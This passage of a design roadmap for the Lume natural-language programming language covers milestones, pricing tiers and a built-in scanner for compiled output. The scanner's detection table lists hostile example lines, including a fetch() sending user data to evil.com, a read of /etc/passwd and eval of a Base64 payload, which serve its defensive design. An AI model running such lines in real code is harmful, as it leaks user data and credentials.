lume explain app.js --mode summary     # Summary instead of line-by-line
lume explain app.js --mode annotate    # Line-by-line annotations (default)
```

### Use Cases

1. **Learning** — students read code explanations in their native language
2. **Onboarding** — new developers on a project get plain-language explanations of what each file does
3. **Documentation** — auto-generate documentation in any language from the code itself
4. **Code review** — explain what changed in a pull request in plain language
5. **Accessibility** — combined with text-to-speech, code can be *read aloud* as an explanation

### Academy Integration

This transforms Lume Academy instantly. Every code example can be explained in any language. A student in Brazil clicks "Explain in Portuguese" and the code block gets a line-by-line annotation. No translation of course content needed — the code explains itself.

### Acceptance Criteria

- [ ] `lume explain` command produces accurate line-by-line annotations
- [ ] Summary mode produces a coherent paragraph-level explanation
- [ ] Output language follows `--lang` flag or auto-detects from user locale
- [ ] Works on JavaScript, TypeScript, and Lume files
- [ ] Handles complex patterns (async/await, closures, higher-order functions)
- [ ] Explanations are accurate and use everyday language, not jargon

---

## MILESTONE 12: COLLABORATIVE INTENT (MULTI-DEVELOPER, MULTI-LANGUAGE)

### What It Is

Multiple developers write in different human languages on the same project. The compiler merges their contributions at the AST level, which is language-neutral. No merge conflicts caused by language differences.

### IMPORTANT NOTE ON COMPLEXITY

This is the most architecturally complex milestone in the entire roadmap. AST-level diffing and real-time sync with CRDT/OT is essentially building a collaborative editing engine (like the internals of Google Docs). Consider splitting this into sub-phases:

- **Phase A (required):** AST-level diffing for Git-based workflows. Each developer writes in their language, commits, and merges happen at the AST level instead of text level. This is achievable as a Git merge driver or pre-commit hook.
- **Phase B (stretch goal):** Real-time collaboration with the Lume Sync Protocol. This is significantly more complex and can be deferred if Phase A is solid.

Build Phase A first. Only move to Phase B if Phase A is complete and tested.

### How It Works

Because the AST is the same regardless of input language (established in Milestone 8), version control operates on the AST, not on the raw text. Two developers can edit the same logical block — one in English, one in Japanese — and the merge happens at the intent level.

### Implementation

**AST-Level Diffing (Phase A):**
- Instead of line-by-line text diffs (like Git does today), Lume's version control diffs the AST
- Two changes to the same AST node = actual conflict (requires resolution)
- Two changes to different AST nodes = clean merge (even if the text lines overlap)

**Language-Tagged Source:**
Each line in the source file carries metadata about which language it was written in:
```
mode: natural

# Written by: developer-a (English)
get all active users from the database

# Written by: developer-b (Japanese)
アクティブなユーザーの名前を表示する
```

Both lines produce AST nodes. The compiler doesn't care about the language tags — they're metadata for the developers. The AST diff engine resolves merges.

**Lume Sync Protocol (Phase B — stretch goal):**
For real-time collaboration (like Google Docs for code):
- Each developer's editor sends intent operations to a central server
- Intent operations are language-neutral AST transformations
- The server merges operations using operational transformation (OT) or CRDTs
- Each developer sees the code in their own language (the server translates the shared AST back to each developer's preferred language)

### Visual Example

Developer A (Dallas, English) and Developer B (Tokyo, Japanese) are working on the same file simultaneously:

**What Developer A sees:**
```
mode: natural
get all active users from the database
show their names in a list
when a name is clicked, show that user's profile
```

**What Developer B sees (same file, same AST, different language):**
```
mode: natural
データベースからすべてのアクティブユーザーを取得する
名前をリストに表示する
名前がクリックされたら、そのユーザーのプロファイルを表示する
```

**What gets compiled (identical for both):**
```javascript
const users = await db.query("SELECT * FROM users WHERE active = true");
renderList(users.map(u => u.name), {
  onClick: (user) => showProfile(user)
});
```

### Acceptance Criteria

**Phase A (required):**
- [ ] AST-level diffing produces cleaner merges than text-level diffing
- [ ] Two developers in different languages can edit the same file without language-based conflicts
- [ ] Each developer can view the shared codebase rendered in their preferred language
- [ ] Merge conflicts only occur when two developers modify the same logical operation

**Phase B (stretch goal):**
- [ ] Real-time collaboration syncs intent operations, not text
- [ ] Multiple simultaneous editors in different languages see consistent state

---

## MILESTONE 13: ZERO-DEPENDENCY RUNTIME

### What It Is

The ultimate goal: Lume programs written in natural language compile to standalone executables that run without Node.js, without a browser, without any external runtime. One file in, one executable out. Write in English (or any language), get a program that runs anywhere.

### How It Works

```
Natural Language -> Intent Resolver -> Lume AST -> Transpiler -> JavaScript -> Bundler -> Standalone Executable
```

The addition is the final two stages:
1. **Bundler** — tree-shakes and bundles all JavaScript output into a single file with zero imports
2. **Executable Compiler** — compiles the bundled JS into a native binary

### Implementation

**Stage 1: Single-file JavaScript output**
- The transpiler already outputs JavaScript
- Add a bundler pass that resolves all imports, inlines dependencies, and produces one self-contained `.js` file
- This file can run with `node app.bundle.js` — but still requires Node.js

**Stage 2: Standalone binary — USE BUN COMPILE AS PRIMARY APPROACH**
- Primary: **Bun compile** — `bun build --compile app.bundle.js --outfile app` -> produces a single binary. This is the most mature option and produces the smallest binaries.
- Fallback: **Deno compile** — `deno compile app.bundle.js` -> cross-platform binary. Use this if Bun is unavailable.
- Do NOT use `pkg` (deprecated) or build a custom V8 snapshot (too much work for this milestone).

**Stage 3: Cross-compilation**
- `lume build app.lume --target linux` -> Linux binary
- `lume build app.lume --target macos` -> macOS binary
- `lume build app.lume --target windows` -> Windows .exe
- `lume build app.lume --target wasm` -> WebAssembly (runs in any browser without a server)

### CLI Usage

```bash
lume build app.lume                         # Standard JS output (unchanged)
lume build app.lume --bundle                # Single-file JS (no external imports)
lume build app.lume --compile               # Standalone binary for current OS
lume build app.lume --compile --target linux # Cross-compile for Linux
lume build app.lume --compile --target wasm  # WebAssembly output
```

### What This Means

Someone writes a program in plain French on their Mac. They run `lume build --compile --target windows` and hand the resulting `.exe` to a Windows user who has never heard of Lume, Node.js, or JavaScript. The program just runs. No installation, no runtime, no dependencies.

### Acceptance Criteria

- [ ] `--bundle` flag produces a single self-contained `.js` file with zero imports
- [ ] `--compile` flag produces a standalone binary using Bun compile
- [ ] Cross-compilation works for linux, macos, windows targets
- [ ] WebAssembly output works in browsers without a server
- [ ] Self-sustaining features (monitor, heal, optimize, evolve) work in compiled binaries

---

## WHAT NONE OF THIS CHANGES

- The existing Lume syntax (`let`, `ask`, `show`, `think`, `to`, `define`, `repeat`, `for each`, `while`, `use`, `expose`, etc.) is fully preserved and unchanged
- Standard `.lume` files without a mode declaration compile exactly as they do today through the existing Lexer -> Parser -> AST -> Transpiler pipeline
- The Transpiler is the single source of truth for JavaScript output — extend it for new AST node types if needed, but do not modify how it handles existing node types
- The self-sustaining features (monitor, heal, optimize, evolve, mutate) are untouched and must work in all modes
- npm package structure is unchanged — all milestones are additive features
- Backward compatibility is absolute — nothing breaks. All 219 existing tests must continue to pass after every milestone.

---

## PRIORITY / BUILD ORDER

| Order | Milestone | Dependency | Effort | Notes |
|-------|-----------|------------|--------|-------|
| 1st | **M7: English Mode (Layer A only)** | None | Pattern library + Intent Resolver scaffold | Start here. Everything else depends on this. |
| 2nd | **M7: English Mode (Layer B)** | M7-A | AI integration for complex sentences | Extends M7-A with LLM calls for ambiguous input. |
| 3rd | **M8: Multilingual Mode** | M7 | Expand pattern library + auto-detect language | Straightforward extension of M7. |
| 4th | **M9: Voice-to-Code** | M8 | Whisper/Web Speech API front-end | Quick win — reuses Intent Resolver. |
| 5th | **M11: Reverse Mode** | M7 | AST -> explanation generator | Quick win — reverse direction of same pipeline. |
| 6th | **M10: Visual Context** | M7 | UI Element Registry + spatial resolution | More complex — needs full context engine. |
| 7th | **M13: Zero-Dependency Runtime** | M7 | Bundler + Bun compile | Independent of NL features — can run in parallel with M10. |
| 8th | **M12: Collaborative Intent** | M8 | AST diffing + real-time sync protocol | Most complex. Build Phase A only; Phase B is stretch goal. |

M9 and M11 are the quickest wins after M7-M8 because they reuse the same pipeline in different directions. M10 and M12 are the most architecturally complex. M13 is independent of the natural language features — it can be worked on in parallel with M10.

---

## WHAT SUCCESS LOOKS LIKE

A developer opens a `.lume` file, writes `mode: natural` at the top, and writes their program in plain French. They run `lume build --compile` and get a standalone executable. They hand it to someone who has never coded, on any operating system, and it runs.

A classroom in Mumbai teaches programming in Hindi. A team in Sao Paulo collaborates in Portuguese with a partner in Berlin writing in German. A solo founder in Dallas speaks their app into existence while driving.

No syntax to memorize. No English requirement. No runtime to install. No language barrier.

That's Lume.

---

## ACADEMY UPDATES NEEDED

Once milestones are implemented, the Lume Academy (on dwtl.io and academy.tlid.io) will need:

1. New track: "Natural Language Programming with Lume" (covers M7-M8)
2. Updated playground to support `mode: english` and `mode: natural` headers
3. Example programs written in multiple languages showing identical output
4. Voice input demo in the playground (M9)
5. "Explain This Code" button on every code example, with language selector (M11)
6. Documentation of the pattern library (all supported phrases, all languages)
7. Certification: **Certified Lume Natural Language Developer (CNLD)**

Trust Layer will handle the Academy content updates. The Lume agent just needs to expose the compiler functionality.

---

## MONETIZATION & BUSINESS MODEL

The Lume compiler is free and open source. This is a strategic decision — every successful programming language is free (JavaScript, Python, TypeScript, Go, Rust). Charging for the compiler kills adoption. The value of Lume is proportional to the number of people using it. Maximize adoption, monetize around it.

**What this means for the build:** Several features need free/paid tier logic built into them from the start. This is not a separate system to add later — it's baked into the architecture.

### Tier Structure

| Feature | Free | Pro ($15/mo) | Team ($12/mo/seat) | Enterprise (custom) |
|---------|------|-------------|-------------------|-------------------|
| Compiler (Layer A — pattern matching) | Unlimited | Unlimited | Unlimited | Unlimited |
| AI resolutions (Layer B) | 100/month | Unlimited | Unlimited + shared billing | Unlimited + SLA |
| Community patterns (receive) | Weekly sync | Real-time sync | Real-time sync | Real-time + on-premise registry |
| Community patterns (contribute) | Yes | Yes | Yes | Optional (some enterprises keep patterns private) |
| Compile lock file | Yes | Yes | Yes | Yes |
| Security layer | Yes | Yes | Yes + custom security-config templates | Yes + compliance auditing |
| Pattern analytics | Basic (count only) | Full (usage trends, compile time, AI cost tracking) | Full + team-wide dashboards | Full + custom reporting |
| Team pattern library | No | No | Yes — shared patterns across team projects | Yes + access controls |
| Source maps | Yes | Yes | Yes | Yes |
| Sandbox mode | Yes | Yes | Yes | Yes + enterprise sandbox policies |
| Support | Community (GitHub issues) | Email support (48h response) | Priority support (24h response) | Dedicated support + SLA (4h response) |
| Certification (CNLD) | No | Exam access included | Exam access for all seats | Custom training + on-site |

### Implementation Requirements for the Build Agent

**1. Usage tracking for Layer B (AI resolutions):**
The compiler must track how many Layer B (AI) calls a user makes per month. This requires:
- A user authentication system on `lume-lang.com` (email + password or GitHub OAuth)
- An API key that the CLI uses: `lume config set api-key <key>`
- A usage counter stored server-side: `GET /api/usage` returns `{ "ai_resolutions_used": 47, "ai_resolutions_limit": 100, "period": "2026-09" }`
- When the free tier limit is reached, Layer B is disabled with a clear message: `"You've used 100/100 free AI resolutions this month. Upgrade to Pro for unlimited: lume-lang.com/pricing"`
- Layer A (pattern matching) is NEVER limited — it runs locally, no server needed, always free
- Unauthenticated users get 10 AI resolutions to try it out before requiring signup

**2. Pattern registry tiers:**
The Collective Intelligence registry API (`lume-lang.com/patterns`) must differentiate tiers:
- Free users: `lume patterns sync` pulls the latest community patterns once per week (cached locally, checked via `Last-Modified` header)
- Pro/Team users: real-time sync — patterns are available immediately when promoted
- Enterprise: option to run a private pattern registry on-premise (`lume config set registry.url https://internal.company.com/patterns`)

**3. Team features:**
Team tier requires:
- Organization accounts on `lume-lang.com`
- Shared billing (one bill, multiple seats)
- Team-level pattern libraries: patterns learned by any team member are available to all team members
- Admin controls: team leads can lock `.lume/security-config.json` so individual devs can't weaken security
- Team analytics dashboard: compile times, AI usage, pattern coverage across all team projects

**4. Certification system:**
The CNLD (Certified Lume Natural Language Developer) certification:
- Available through DarkWave Academy (`academy.tlid.io`)
- Exam covers: English Mode syntax, Tolerance Chain behavior, Security Layer awareness, debugging with source maps, testing with Given/When/Then
- Pro tier includes exam access ($15/month gets both unlimited AI and certification)
- Passing generates a verifiable certificate with a unique ID and a badge for LinkedIn/GitHub profile
- Certificate verification: `lume-lang.com/verify/<cert-id>` shows name, date, score

**5. Stripe integration for payments:**
- Use Stripe for subscription management (the DarkWave ecosystem already has Stripe keys)
- Subscription management page at `lume-lang.com/billing`
- CLI can check subscription status: `lume account status`
- Webhook endpoint for Stripe events (subscription created, canceled, payment failed)
- Grace period: if payment fails, Pro features remain active for 7 days before downgrading

### 6. Guardian Output Scanner — Built-In Compiled Code Security

**IMPORTANT: This is NOT the Guardian Scanner product from the DarkWave ecosystem (guardianscanner.tlid.io). This is a separate, built-in component of the Lume compiler itself.** It operates on the same philosophy — scan everything, flag suspicious patterns, give the user information to decide — but it is part of Lume, ships with Lume, and runs automatically for EVERY developer on EVERY compilation. It is not optional, not a subscription feature, not a separate download. When someone installs Lume and compiles a program, the Guardian Output Scanner runs. It is as fundamental to the compiler as the Auto-Correct Layer or the Tolerance Chain.

The security layer (Section 3 in Critical Architectural Requirements) scans the INPUT — the English instructions. But once the code is compiled to JavaScript, a second security pass is needed on the OUTPUT. The Guardian Output Scanner scans the compiled code for malicious patterns, red flags, and suspicious behavior before it's written to disk.

**Why input scanning alone is not enough:**

1. **`raw:` escape hatch bypass:** Developers can inject arbitrary JavaScript via `raw:` blocks. The input security layer intentionally skips these because the developer took control. But that raw code could contain malicious JavaScript — backdoors, keyloggers, obfuscated exfiltration, crypto miners. The compiled output must be scanned regardless of how it got there.

2. **Pattern poisoning via Collective Intelligence:** If someone contributes a malicious pattern to the community registry (maps an innocent phrase to a dangerous AST node), the input scanner wouldn't flag it because the English looks normal. The compiled JavaScript output is where the malice appears.

3. **Cross-module attacks:** A single module looks clean. But when combined with another module, the compiled output does something neither module does alone. Only scanning the final compiled JavaScript catches this.

4. **AI-generated code review:** When Layer B (AI resolution) generates AST nodes, the AI could occasionally produce code with unintended side effects. Scanning the compiled output catches anything the AI got wrong.

**Compiled Output Scanner — what it checks:**

| Scan Category | What It Detects | Example |
|--------------|----------------|---------|
| Network exfiltration | Outbound requests to unknown/suspicious domains | `fetch('https://evil.com/collect', { body: JSON.stringify(userData) })` |
| File system access | Reads/writes outside the project directory | `fs.readFileSync('/etc/passwd')` |
| Credential access | References to env vars, API keys, tokens | `process.env.DATABASE_URL` sent to external endpoint |
| Obfuscated code | Base64-encoded strings, eval(), new Function(), heavily obfuscated variable names | `eval(atob('bWFsaWNpb3Vz'))` |
| Crypto mining | CPU-intensive loops with no apparent purpose, WebSocket connections to mining pools | Infinite hash computation loops |
| Data collection | Excessive data aggregation before a network call | Collecting user data from multiple sources into a single object, then POSTing it |
| Dependency hijacking | Imports from unexpected or lookalike packages | `require('lod-ash')` instead of `require('lodash')` |
| Infinite resource consumption | Unbounded recursion, memory allocation without limits | `while(true) { array.push(new ArrayBuffer(1e8)) }` |

**How it works in the pipeline:**

```
English Input -> Auto-Correct -> Intent Resolver -> Security Layer (INPUT scan)
-> Lume AST -> Transpiler -> JavaScript
-> Guardian Output Scanner (OUTPUT scan) -> If clean: write file + compile lock
                                          -> If flagged: show report, block output
```

The Guardian Output Scanner runs AFTER the transpiler produces JavaScript, BEFORE the output is written to disk. If it flags anything, the developer sees a report:

```
[guardian] Compiled output scan for app.lume:

  WARNING — Line 12 (from raw: block, line 8 in source):
    Detected outbound network request to external domain: "api.unknown-service.com"
    This was not declared in the project's allowed_domains list.
    Risk: Potential data exfiltration
    Action: Review this request. If intentional, add to allowed_domains in .lume/security-config.json

  WARNING — Line 34 (compiled from "save the user preferences"):
    Detected eval() usage in compiled output.
    eval() executes arbitrary code and is a common attack vector.
    Risk: Code injection
    Action: Review the compiled JavaScript. If this is intentional, acknowledge with --accept-risk flag.

  BLOCK — Line 47 (from raw: block, line 22 in source):
    Detected obfuscated code: Base64-encoded string passed to eval()
    This is a common pattern for hiding malicious payloads.
    Risk: HIGH — hidden code execution
    Action: BLOCKED. This code will not be written to output. Remove the obfuscated code or use plain JavaScript.

Scan result: 2 warnings, 1 block
Output NOT written. Resolve the blocked issue and re-compile.
```

**Scan levels (configurable in `.lume/security-config.json`):**

```json
{
  "guardian_output_scan": {
    "enabled": true,
    "level": "standard",
    "block_obfuscated_code": true,
    "block_eval": true,
    "allowed_domains": ["api.myapp.com", "localhost"],
    "scan_raw_blocks": true,
    "scan_ai_generated": true,
    "scan_community_patterns": true
  }
}
```

Scan levels:
- `"off"` — no output scanning (not recommended)
- `"basic"` — only check for eval(), obfuscated code, and file system access outside project
- `"standard"` — full scan (default) — all categories listed above
- `"strict"` — everything in standard + flag any network request, any file system access, any dependency import for manual review. For high-security environments.

**Community pattern validation:**
When a pattern is downloaded from the Collective Intelligence registry (`lume patterns sync`), the Guardian Output Scanner automatically compiles a test case using the new pattern and scans the output before adding it to the local pattern library. If the compiled output of ANY community pattern triggers a Guardian warning, the pattern is quarantined:

```
[guardian] Community pattern scan:
  Pattern: "save user preferences" (contributed by anonymous, confirmed by 142 users)
  Test compilation: FLAGGED — compiled output contains network request to undeclared domain
  Action: Pattern quarantined. Not added to local library.
  Report sent to registry maintainers for review.
```

This prevents pattern poisoning. Even if a malicious pattern gets 142 fake confirmations, the Guardian Output Scanner catches it at download time on every developer's machine.

### What Stays Free Forever (Non-Negotiable)

These features must NEVER be paywalled — doing so would kill adoption:

- The compiler itself (Layer A pattern matching, Auto-Correct, Tolerance Chain Steps 1-3)
- All CLI commands (`lume build`, `lume run`, `lume repl`, `lume test`, `lume explain`)
- Compile lock files and deterministic builds
- Security layer (all 11 threat categories)
- Guardian Output Scanner (built into the compiler — every developer, every compilation, always)
- Sandbox mode
- Source maps
- The pattern library that ships with each release
- Offline compilation (Layer A)
- Open source code on GitHub

**The line is clear:** anything that runs on the developer's machine is free. Anything that uses server resources (AI calls, real-time pattern sync, team management, analytics) has a free tier with paid upgrades.

### Revenue Projections (For Context Only — Not Part of the Build)

These are estimates to validate that the model works. Not build requirements.

- 1,000 developers using Lume -> ~5% convert to Pro -> 50 x $15/mo = $750/mo
- 10,000 developers -> ~5% Pro, ~2% Team -> 500 x $15 + 40 teams x 5 seats x $12 = $9,900/mo
- 100,000 developers -> ~5% Pro, ~3% Team -> $117,000/mo
- Enterprise deals are separate and vary: $500-5,000/mo each

The Academy certification and ecosystem funnel (Lume -> Trust Layer -> DarkWave ecosystem -> SIG/Shell transactions) are additional revenue on top of these numbers.

---

## CONTACT

- **Ecosystem owner:** Jason (cryptocreeper94@gmail.com)
- **Trust Layer DB user_id:** 49057269
- **Launch date:** August 23, 2026
- **Lume Academy:** /academy on dwtl.io
- **Lume Language:** lume-lang.com / lume-lang.org
